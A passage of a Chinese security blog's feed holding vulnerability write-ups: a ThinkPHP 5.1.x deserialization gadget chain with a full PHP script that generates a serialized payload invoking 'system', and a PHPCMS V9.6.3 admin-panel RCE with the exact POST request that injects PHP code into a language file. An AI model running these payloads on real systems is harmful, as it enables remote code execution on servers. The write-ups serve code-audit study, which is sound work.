$name) &#123;</span><br><span class="line">          <span class="comment">// 解析name</span></span><br><span class="line">          <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">              <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">              <span class="keyword">return</span> $default;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">              <span class="keyword">return</span> $data;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 解析过滤器</span></span><br><span class="line">      $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">          array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">          <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">              <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">              <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Request 类中的 param 函数调用了 input 函数，但同样参数不可控，再往上寻找调用点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">          <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">          $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">          $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>转到 isAjax 函数的定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">    $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>$ajax</code> 参数没有对类型的限制，而且 param 的参数来自 <code>$this-&gt;config</code>，是可控的，param 在最后所调用的 input 函数的 <code>$this-&gt;param, $name</code> 就都可控</p><p>跟进 get 和 route 函数不难发现 <code>$this-&gt;param</code> 的值来自 GET 请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">http://127.0.0.1:9000/public/?test=pwd</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$this-&gt;param = array("test"=&gt;"pwd")</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>那么回到 input 函数看处理流程</p><p>首先 <code>$this-&gt;getData($data, $name)</code> 得到 <code>$data</code>，跟进分析，返回 <code>$data</code> 为 <code>$data[$val]</code> 的值，即 <code>$data[$name]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">            $data = $data[$val];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到 input，接着处理 <code>$filter = $this-&gt;getFilter($filter, $default);</code></p><p>getFilter 的两个参数分别为 <code>&#39;&#39;</code> 和 <code>null</code> 且都不可控，但是跟进不难看出最后返回 <code>$filter</code> 的值就是 <code>$this-&gt;filter</code>，虽然后面 <code>$filter[] = $default;</code> 会给 filter 数组追加个值为 <code>null</code> 的元素，但后面 filterValue 中的 array_pop 函数正好给去掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">        <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就得到一条可控变量的函数调用链，最后执行命令</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/eUh8BInif3zjXZC.png" alt></p><p>下面简单梳理下流程</p><ol><li><p>通过 Windows 类 <code>__destruct()</code> 方法调用到 <code>file_exists</code> 触发某类的 <code>__toString()</code> 来到 <code>toArray()</code> 函数</p></li><li><p>通过控制分别位于 Attribute 和 Conversion 的 <code>$data</code> 和 <code>$append</code> 变量执行在 Request 中不存在的 <code>visible</code> 函数进而触发其 <code>__call()</code></p></li><li><p>在 Request 通过控制 <code>$hook $filter $config</code> 三个变量的值注入最终的 callback 名称和参数，再经这么一系列函数调用执行命令</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call() ---&gt; call_user_func_array() ---&gt; isAjax() ---&gt; param() ---&gt; input() ---&gt; filterValue() ---&gt; call_user_func()</span><br></pre></td></tr></table></figure><p>画个图就直观多了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/2dkOGY7IWPcSjFt.png" alt></p><p>构造 Payload</p><p>由于 Model 类是 abstract 类型，无法实例化，而extends Model 的也只有一个 Pivot 类，所以就用它吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"a"</span>=&gt;[<span class="string">""</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"a"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $files = [];</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure><p>自己先构造一个利用点反序列化我们的内容，生成好 payload，GET 传入要执行的命令，命令别忘了 urlencode</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/VLxya37wOjihbSm.png" alt></p><p>查看调用堆栈</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/pFUwl2T94GqOyng.png" alt></p><hr><p>Reference:</p><p><a href="https://paper.seebug.org/1040/" target="_blank" rel="noopener">https://paper.seebug.org/1040/</a><br><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章首发于合天智汇：&lt;a href=&quot;https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="反序列化" scheme="http://j0k3r.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="ThinkPHP" scheme="http://j0k3r.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>PHPCMS V9.6.3 后台一处 RCE</title>
    <link href="http://j0k3r.top/2019/10/09/phpcmsv9.6.3_background_rce/"/>
    <id>http://j0k3r.top/2019/10/09/phpcmsv9.6.3_background_rce/</id>
    <published>2019-10-08T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:07.192Z</updated>
    
    <content type="html"><![CDATA[<p>没想到这个洞撞了。。。</p><a id="more"></a><p>版本与环境</p><p>PHPCMS程序版本：Phpcms V9.6.3 Release 20170515 </p><p>操作系统：Darwin</p><p>服务器软件：ApachePHP/5.6.37</p><p>MySQL 版本：5.7.26</p><p><a href="http://127.0.0.1:9000/index.php?m=member&amp;c=member_menu&amp;a=add&amp;pc_hash=wCuF7w" target="_blank" rel="noopener">http://127.0.0.1:9000/index.php?m=member&amp;c=member_menu&amp;a=add&amp;pc_hash=wCuF7w</a></p><p>dosubmit=1&amp;language=%0a%0d’;//</p><h2 id="一处-phpcms-后台-GetShell"><a href="#一处-phpcms-后台-GetShell" class="headerlink" title="一处 phpcms 后台 GetShell"></a>一处 phpcms 后台 GetShell</h2><p>漏洞代码位于 <code>/phpcms/modules/admin/menu.php</code> 第 81 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">$id = intval($_POST[<span class="string">'id'</span>]);</span><br><span class="line"><span class="comment">//print_r($_POST['info']);exit;</span></span><br><span class="line">$r = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;update($_POST[<span class="string">'info'</span>],<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br><span class="line"><span class="comment">//修改语言文件</span></span><br><span class="line">$file = PC_PATH.<span class="string">'languages'</span>.DIRECTORY_SEPARATOR.<span class="string">'zh-cn'</span>.DIRECTORY_SEPARATOR.<span class="string">'system_menu.lang.php'</span>;</span><br><span class="line"><span class="keyword">require</span> $file;</span><br><span class="line">$key = $_POST[<span class="string">'info'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($LANG[$key])) &#123;</span><br><span class="line">$content = file_get_contents($file);</span><br><span class="line">$content = substr($content,<span class="number">0</span>,<span class="number">-2</span>);</span><br><span class="line">$data = $content.<span class="string">"\$LANG['$key'] = '$_POST[language]';\r\n?&gt;"</span>;</span><br><span class="line">file_put_contents($file,$data);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>($LANG[$key]) &amp;&amp; $LANG[$key]!=$_POST[<span class="string">'language'</span>]) &#123;</span><br><span class="line">$content = file_get_contents($file);</span><br><span class="line">$content = str_replace($LANG[$key],$_POST[<span class="string">'language'</span>],$content);</span><br><span class="line">file_put_contents($file,$content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;update_menu_models($id, $r, $_POST[<span class="string">'info'</span>]);</span><br><span class="line"><span class="comment">//结束语言文件修改</span></span><br><span class="line">showmessage(L(<span class="string">'operation_success'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">.  .  .   .  .  .  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是修改语言文件用的，而这个语言文件就是 /phpcms/languages/zh-cn/system_menu.lang.php</p><p>里面一堆类似 <code>$LANG[&#39;video&#39;] = &#39;视频&#39;;</code> 的东西</p><p>当时用 rips 扫描发现的大多是 <code>$data = $content.&quot;\$LANG[&#39;$key&#39;] = &#39;$_POST[language]&#39;;\r\n?&gt;&quot;;</code> 这种拼接操作，而且 POST 中的单引号会被转义，无法逃逸</p><p>转义代码位于 /phpcms/libs/classes/param.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc()) &#123;</span><br><span class="line">$_POST = new_addslashes($_POST);</span><br><span class="line">$_GET = new_addslashes($_GET);</span><br><span class="line">$_REQUEST = new_addslashes($_REQUEST);</span><br><span class="line">$_COOKIE = new_addslashes($_COOKIE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这里突然看到一个 str_replace ， <code>str_replace($LANG[$key],$_POST[&#39;language&#39;],$content)</code>，感觉可能会有漏洞</p><p>一番胡乱测试之后惊奇的发现网站 500 了，细看原来是单引号逃逸导致报错</p><p>下面是漏洞分析过程</p><p>首先要登录后台拿到 pc_hash 的值，这个是防止提交恶意数据的，后台首页 F12 就能看到</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/phpcmsv9.6.3_background_rce.assets/wzFMlLcQSB4qAve.png" alt></p><p>然后访问：</p><p><code>http://127.0.0.1:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w</code></p><p>phpcms 的路由和那个 yzmcms 差不多，m 是模块名，对应 /phpcms 下的文件夹，c 是控制器名，对应 /phpcms/模块/ 下的 php 文件名，a    则对应控制器类的类函数名</p><p>发送 POST 请求：</p><p><code>dosubmit=1&amp;info[name]=1&amp;language=1</code></p><p>语言文件最后会新添内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$LANG[<span class="string">'1'</span>] = <span class="string">'1'</span>;</span><br></pre></td></tr></table></figure><h3 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h3><p>发送 POST 请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dosubmit=1&amp;info[name]=1&amp;language=1&apos;</span><br></pre></td></tr></table></figure><p><code>require $file;</code> 引入语言文件，<code>$LANG[$key]</code> 的值还是 NULL，所以执行拼接操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = $content.<span class="string">"\$LANG['$key'] = '$_POST[language]';\r\n?&gt;"</span>;</span><br><span class="line">file_put_contents($file,$data);</span><br></pre></td></tr></table></figure><p>得到语言文件新添内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$LANG[<span class="string">'1'</span>] = <span class="string">'1\''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h3><p>发送与第一次相同的 POST 请求</p><p><code>require $file;</code> 引入语言文件得到 <code>$LANG[$key]</code> 的值是 <code>string(2) &quot;1&#39;&quot;</code>，也就是说，没有反斜杠，这样问题就出现了，我们同样的请求发送了两次，按照代码逻辑来看，是不应该更新 <code>$LANG[$key]</code> 的值的</p><p>但是因为 <code>require</code> 和 <code>file_get_contents</code> 函数读取之后的文件内容不含反斜杠，而我们 POST 传入的 language 会被转义处理得到的值是 <code>string(3) &quot;1\&#39;&quot;</code></p><p>于是判断 <code>$LANG[$key]!=$_POST[&#39;language&#39;]</code> 就成立了，接着 <code>str_replace</code> 函数进行字符串替换操作，把原来的 <code>$LANG[&#39;1&#39;] = &#39;1\&#39;&#39;;</code> 中的 <code>1&#39;</code> 替换成 <code>1\&#39;</code>，最终写入文件</p><p>结果就得到了以下文件内容，第二个单引号被反斜杠转义，无法闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$LANG[<span class="string">'1\'] = '</span><span class="number">1</span>\<span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><p>发送两次以下请求，访问语言文件 <a href="http://127.0.0.1:9000/phpcms/languages/zh-cn/system_menu.lang.php" target="_blank" rel="noopener">http://127.0.0.1:9000/phpcms/languages/zh-cn/system_menu.lang.php</a> 即可得到 phpinfo</p><p>URL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9000/index.php?m=admin&amp;c=menu&amp;a=edit&amp;pc_hash=wCuF7w</span><br></pre></td></tr></table></figure><p>POST:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dosubmit=1&amp;info[name]=];phpinfo();//1&amp;language=];phpinfo();//1&apos;</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/phpcmsv9.6.3_background_rce.assets/K35MzBryDITZedu.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;没想到这个洞撞了。。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://j0k3r.top/tags/PHP/"/>
    
      <category term="代码审计" scheme="http://j0k3r.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 原型链污染 (Prototype Pollution) &amp;&amp; Hardjs 复现与分析</title>
    <link href="http://j0k3r.top/2019/09/10/js_prototype_pollution/"/>
    <id>http://j0k3r.top/2019/09/10/js_prototype_pollution/</id>
    <published>2019-09-09T16:00:00.000Z</published>
    <updated>2020-03-26T11:17:21.312Z</updated>
    
